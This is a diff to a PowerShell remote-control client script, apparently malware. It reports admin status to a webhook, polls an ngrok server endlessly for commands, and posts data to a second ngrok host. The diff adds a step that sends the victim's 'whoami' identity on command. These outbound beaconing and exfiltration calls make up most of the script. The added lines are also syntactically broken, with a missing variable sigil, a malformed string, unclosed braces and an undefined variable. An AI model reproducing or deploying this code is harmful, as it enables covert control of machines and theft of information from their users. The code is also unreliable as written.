@@ -4,15 +4,19 @@ $ran = Get-Random
 
 $c = $null
 
+clients = whoami
+
+clients += " " "
+
 $body = $null
 
 $notification = "all data image related will be sent here"
 
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
-	$check = "we are not admin"
+    $check = "we are not admin"
 }else{
-	$check = "we are admin"
+    $check = "we are admin"
 }
 
 # attempt to send new client data to http server
@@ -32,23 +36,23 @@ $cb = $check,$ran,$notification
 
 foreach ($item in $cb) {
     $body += "$item`n"
-	}
+    }
 
 $jsonBody = @{
     'username' = $ran
     'content' = $body
 }
 
-	$jsonBody = $jsonBody | ConvertTo-Json
-	Invoke-RestMethod -Uri $webhookUri -Method 'post' -ContentType 'application/json' -Body $jsonBody
+    $jsonBody = $jsonBody | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhookUri -Method 'post' -ContentType 'application/json' -Body $jsonBody
 
 while ($true)
 {
 
     # try endlessly...
-	$MAIN = Invoke-WebRequest -Timeout 1 'https://serverhttp.ngrok.io' | Select-Object -Expand Content
+    $MAIN = Invoke-WebRequest -Timeout 1 'https://serverhttp.ngrok.io' | Select-Object -Expand Content
 
-	# if the http content corresponds to the random string, do the following...
+    # if the http content corresponds to the random string, do the following...
 
     if($MAIN -match $ran){
         
@@ -64,8 +68,17 @@ while ($true)
             $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing 
         }
         catch{
-        	Write-Output web server isnt running...
+            Write-Output web server isnt running...
         }
     }
+
+    if($MAIN -match "clients"){
+        try
+        {
+            $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $whoami -UseBasicParsing
+        }
+        catch{
+           Write-Output web server isnt running...
+    } 
 sleep 0.5
 }
